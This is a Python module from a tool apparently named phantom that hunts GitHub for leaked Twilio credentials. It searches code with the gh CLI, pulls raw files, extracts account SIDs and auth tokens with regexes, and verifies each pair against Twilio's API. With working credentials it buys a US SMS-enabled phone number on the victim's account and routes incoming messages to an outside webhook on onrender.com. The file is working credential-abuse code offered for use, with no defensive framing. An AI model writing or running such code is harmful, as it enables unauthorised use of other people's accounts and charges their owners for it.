"""Tier C — GitHub Credential Hunter (via authenticated gh CLI)."""
import time, re, base64, subprocess, json, os, requests
from phantom.providers.base import BaseProvider, ProviderResult

TWILIO_SID_PATTERN = re.compile(r'AC[a-fA-F0-9]{32}')
AUTH_TOKEN_PATTERN = re.compile(r'[a-fA-F0-9]{32}')

class GitHubLeaks(BaseProvider):
    def fetch(self) -> ProviderResult:
        t0 = time.time()
        # Use gh CLI (authenticated, no rate limit issues)
        try:
            result = subprocess.run(
                ["gh", "search", "code", "AC", "--language", "python", "--limit", "10", "--json", "url,path,repository"],
                capture_output=True, text=True, timeout=30,
            )
            if result.returncode != 0:
                return ProviderResult(provider_name="GitHubLeaks", tier="C", error=f"gh_cli_failed: {result.stderr[:100]}")
            items = json.loads(result.stdout)
            print(f"  [Tier C] gh search returned {len(items)} files")
        except Exception as e:
            return ProviderResult(provider_name="GitHubLeaks", tier="C", error=str(e))

        for item in items:
            raw_url = item["url"].replace("github.com", "raw.githubusercontent.com").replace("/blob/", "/")
            try:
                resp = requests.get(raw_url, timeout=10)
                snippet = resp.text[:3000]
            except Exception:
                continue
            sid_match = TWILIO_SID_PATTERN.search(snippet)
            if not sid_match:
                continue
            sid = sid_match.group(0)
            tokens = AUTH_TOKEN_PATTERN.findall(snippet)
            for token in tokens:
                if token == sid:
                    continue
                if self._verify_credentials(sid, token):
                    number = self._provision_number(sid, token)
                    if number:
                        return ProviderResult(provider_name="GitHubLeaks", phone_number=number,
                                              country_code="US", tier="C", cost=0.0, latency_ms=(time.time()-t0)*1000)
        return ProviderResult(provider_name="GitHubLeaks", tier="C", error="no_active_credentials")

    def _verify_credentials(self, sid, token):
        try:
            url = f"https://api.twilio.com/2010-04-01/Accounts/{sid}"
            auth = base64.b64encode(f"{sid}:{token}".encode()).decode()
            return requests.get(url, headers={"Authorization": f"Basic {auth}"}, timeout=10).status_code == 200
        except: return False

    def _provision_number(self, sid, token):
        try:
            from twilio.rest import Client
            client = Client(sid, token)
            nums = client.available_phone_numbers('US').local.list(sms_enabled=True, limit=1)
            if nums:
                purchased = client.incoming_phone_numbers.create(phone_number=nums[0].phone_number,
                    sms_url="https://phantomlink-listener.onrender.com/webhook")
                return purchased.phone_number.replace("+", "").strip() if purchased.phone_number.startswith("+") else None
        except Exception as e:
            print(f"  [Tier C] Provision failed: {e}")
        return None
